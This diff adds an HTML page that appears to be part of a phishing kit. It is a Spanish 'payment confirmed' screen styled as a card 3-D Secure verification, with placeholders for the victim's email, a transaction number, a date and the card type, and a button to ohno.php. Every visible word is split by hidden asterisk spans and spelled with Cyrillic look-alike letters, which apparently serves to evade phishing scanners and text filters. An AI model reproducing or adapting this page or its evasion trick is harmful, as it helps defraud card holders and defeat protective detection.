@@ -1,0 +1,302 @@
+<meta name="robots" content="noindex">
+
+
+
+<html lang="ko"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zakorojp/bost-js@main/style.css">
+  <link rel="stylesheet" href="./css/styles.css">
+
+  <style>
+  a.btn.btn-w240.ripple {
+    WIDTH: 179px;
+    height: 37px;
+    font-size: 13px;
+    color: #fff;
+    background-color: green;
+    border-color: green;
+    display: inline-block;
+    padding:6px 12px;
+    font-size:14px;
+    font-weight:400;
+    line-height:1.42857143;
+    text-align:center;
+    white-space:nowrap;
+    vertical-align:middle;
+    touch-action:manipulation;
+    cursor:pointer;
+    -webkit-user-select:none;
+    user-select:none;
+    background-image:none;
+    border:1px solid transparent;
+    border-radius:4px;
+	text-decoration: none;
+
+
+}
+
+
+body {
+	margin: 0
+}
+
+img {
+	border: 0
+}
+
+
+input {
+	line-height: normal
+}
+
+fieldset {
+	border: 1px solid silver;
+	margin: 0 2px;
+	padding: .35em .625em .75em
+}
+
+legend {
+	border: 0;
+	padding: 0
+}
+
+
+
+html {
+	font-size: 10px;
+}
+
+body {
+	font-size: 14px;
+	line-height: 1.42857143;
+	color: #333;
+	background-color: #fff
+}
+
+
+img {
+	vertical-align: middle
+}
+
+.img-responsive {
+	display: block;
+	max-width: 100%;
+	height: auto
+}
+
+
+.text-center {
+	text-align: center
+}
+
+
+
+
+* {
+	-moz-box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box
+}
+
+img {
+	height: auto;
+	max-width: 100%
+}
+
+
+.col-6 {
+	width: 50%
+}
+
+
+
+@charset "UTF-8";
+
+
+[class*=" col-"],
+[class^=col-] {
+	padding: 3px 0.714em;
+}
+
+
+body {
+	font-size: 1.25em
+}
+
+@media screen and (min-width:251px) {
+	.row {
+		padding: 1.2%;
+	}
+}
+
+.threeds-one .body,
+.threeds-one .container,
+.threeds-one .header,
+.threeds-one .sticky-footer {
+	max-width: 400px;
+	margin: 0 auto
+}
+
+
+
+
+@-moz-document url-prefix() {}
+
+form {
+	margin-bottom: 0
+}
+
+
+
+@supports (-ms-ime-align:auto) {}
+
+
+.header,
+legend {
+	color: #6f6f6f
+}
+
+
+fieldset {
+	border: 0
+}
+
+fieldset>legend {
+	border-bottom: 0;
+	font-size: 1.00em
+}
+
+.field-validation-error {
+	color: #AB2C29
+}
+img {
+    width: 120PX;
+}
+
+
+
+.IMG {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+}
+input#Credential_Value {
+    font-size: 15;
+    padding: 4px 9px;
+}
+
+.validate-field.row {}
+
+
+.row {
+    display: flex;
+    flex-wrap: nowrap;
+    margin-right: -15px;
+    margin-left: -15px;
+}
+.icon-valida {
+    font-size: 41px;
+    color: green;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+h1 {color: green;}
+</style>
+
+    </head><body><div class="threeds-one">
+      <div class="container container-sticky-footer">
+        <div class="header" id="HeaderLogos">
+          <div class="row no-pad">
+            <div class="col-12 IMG">
+              <img class="img-responsive header-logo pull-left" src="./img/one1.jpg">
+              
+            </div>
+          </div>
+        </div>
+        <div class="container container-sticky-footer">
+            <div class="body" dir="LTR" style="bottom: 54px;">
+              <div class="row form-two-col">
+                <div class="col-12">
+                  <div class="thank-you-container" style="
+    display: flex;
+    align-items: center;
+">
+
+                    
+    <div class="icon-valida">✔</div><h1>¡G<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>а<span style="display:none;">****</span>s<span style="display:none;">****</span> <span style="display:none;">****</span>р<span style="display:none;">****</span>о<span style="display:none;">****</span>r<span style="display:none;">****</span> <span style="display:none;">****</span>s<span style="display:none;">****</span>u<span style="display:none;">****</span> <span style="display:none;">****</span>Р<span style="display:none;">****</span>а<span style="display:none;">****</span>g<span style="display:none;">****</span>о!</h1> 
+	
+
+  </div>
+                  <strong>L<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>v<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span>і<span style="display:none;">****</span>f<span style="display:none;">****</span>і<span style="display:none;">****</span>с<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span>l<span style="display:none;">****</span> <span style="display:none;">****</span>р<span style="display:none;">****</span>а<span style="display:none;">****</span>g<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>s<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>r<span style="display:none;">****</span>е<span style="display:none;">****</span>а<span style="display:none;">****</span>l<span style="display:none;">****</span>і<span style="display:none;">****</span>z<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span>á<span style="display:none;">****</span> <span style="display:none;">****</span>y<span style="display:none;">****</span> <span style="display:none;">****</span>s<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>е<span style="display:none;">****</span>n<span style="display:none;">****</span>v<span style="display:none;">****</span>і<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span>á<span style="display:none;">****</span> <span style="display:none;">****</span>u<span style="display:none;">****</span>n<span style="display:none;">****</span> <span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span>r<span style="display:none;">****</span>r<span style="display:none;">****</span>е<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>е<span style="display:none;">****</span>l<span style="display:none;">****</span>е<span style="display:none;">****</span>с<span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>ó<span style="display:none;">****</span>n<span style="display:none;">****</span>і<span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span>f<span style="display:none;">****</span>і<span style="display:none;">****</span>r<span style="display:none;">****</span>m<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n<span style="display:none;">****</span> <span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>{<span style="display:none;">****</span>{<span style="display:none;">****</span>m<span style="display:none;">****</span>і<span style="display:none;">****</span>m<span style="display:none;">****</span>і<span style="display:none;">****</span>}<span style="display:none;">****</span>}<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span>n<span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>2<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>í<span style="display:none;">****</span>а<span style="display:none;">****</span>s.
+
+</strong><fieldset id="ValidateTransactionDetailsContainer">
+                    
+                    
+                    
+                    
+                    
+                    
+
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">N<span style="display:none;">****</span>ú<span style="display:none;">****</span>m<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>Т<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>n<span style="display:none;">****</span>s<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n</span>
+                      <span class="col-6 always-left-to-right">
+                        <span>#{{tron}}</span>
+                      </span>
+                    </div><div class="validate-field row">
+                      <span class="validate-label col-6">F<span style="display:none;">****</span>е<span style="display:none;">****</span>с<span style="display:none;">****</span>h<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>Т<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>n<span style="display:none;">****</span>s<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n:</span>
+                      <span class="col-6 always-left-to-right">
+                        <span id="date_heure">{{dat}}</span>
+                      </span>
+                    </div><div class="validate-field row">
+                      <span class="validate-label col-6">С<span style="display:none;">****</span>о<span style="display:none;">****</span>r<span style="display:none;">****</span>r<span style="display:none;">****</span>е<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>Е<span style="display:none;">****</span>l<span style="display:none;">****</span>е<span style="display:none;">****</span>с<span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>ó<span style="display:none;">****</span>n<span style="display:none;">****</span>і<span style="display:none;">****</span>с<span style="display:none;">****</span>о</span>
+                      <span class="col-6 always-left-to-right">
+                        <span>{{mimi}}</span>
+                      </span>
+                    </div>
+             
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Р<span style="display:none;">****</span>а<span style="display:none;">****</span>g<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span> <span style="display:none;">****</span>Т<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span>j<span style="display:none;">****</span>е<span style="display:none;">****</span>t<span style="display:none;">****</span>а	</span>
+                      <span class="col-6 always-left-to-right">
+                        <span>{{type}}	</span>
+                      </span>
+                    </div><div class="sticky-footer">
+                      <div class="row no-pad">
+                        <div class="col-12 text-center">
+              <a href="./ohno.php" class="btn btn-w240 ripple" rel="noopener noreferrer">V<span style="display:none;">****</span>о<span style="display:none;">****</span>l<span style="display:none;">****</span>v<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span> <span style="display:none;">****</span>а<span style="display:none;">****</span>l<span style="display:none;">****</span> <span style="display:none;">****</span>I<span style="display:none;">****</span>n<span style="display:none;">****</span>і<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>о</a>
+						                          </div>
+
+    
+
+
+						  
+						  
+
+
+						  
+						  
+						  
+						  
+						  
+						  
+
+                      </div></div>
+                  </fieldset>
+                </div>
+              </div>
+            </div>
+
+          
+        </div>
+      </div>
+    </div>
+  
+  
+  
+  
+
+  
+  
+  </body></html>
